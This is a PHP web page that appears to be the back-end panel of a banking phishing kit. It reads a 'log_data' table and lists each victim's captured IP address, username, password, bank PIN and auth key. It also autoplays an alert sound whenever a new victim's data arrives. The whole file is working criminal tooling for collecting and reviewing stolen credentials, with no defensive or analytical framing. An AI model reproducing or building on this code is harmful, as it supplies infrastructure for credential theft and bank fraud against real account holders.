<!DOCTYPE html>
<html>
<head>
<style>
#customers {
    font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
    border-collapse: collapse;
    width: 100%;
}

#customers td, #customers th {
    border: 1px solid #ddd;
    padding: 8px;
}

#customers tr:nth-child(even){background-color: #f2f2f2;}

#customers tr:hover {background-color: #ddd;}

#customers th {
    padding-top: 12px;
    padding-bottom: 12px;
    text-align: left;
    background-color: #4CAF50;
    color: white;
}
</style>

<?php 
	
	
	include('db_connection.php');
 

 ?> 
</head>
<body>

<table id="customers">
  <tr>
  <th>#</th>
    <th>IP - Address </th>
    <th>Username </th>
    <th>Password </th>
	<th>Bank Key </th>
	<th>Auth Key</th>
  </tr>
 
  <?php
  try {
  $result = $pdo->prepare('SELECT * FROM log_data');
				$result->execute();
				session_start();
				if((((int)$_SESSION['rows']) < $result->rowCount() ))
				{

				echo " <audio controls autoplay>
  <source  src='bfiles/assets/bankpin.mp3'  type='audio/ogg'></audio>" ;

				}
				 $_SESSION['rows'] = $result->rowCount();
				 
  
while($row = $result->fetch(PDO::FETCH_ASSOC)) {
				
					?>
					<tr>
					<td><?php echo $row['id'] ?></td>
					<td><?php echo $row['ip'] ?></td>
					<td><?php echo $row['username'] ?></td>
					<td><?php echo $row['password'] ?></td>
					<td><?php echo $row['bank_pin'] ?></td>
					<td><?php echo $row['auth_key'] ?></td>
					
					</tr>
					
					<?php 
					
					
					
				}
  
  }
   catch (PDOException $e) {
    print $e->getMessage();
  }
  
  
  ?>
</table>

</body>
</html>
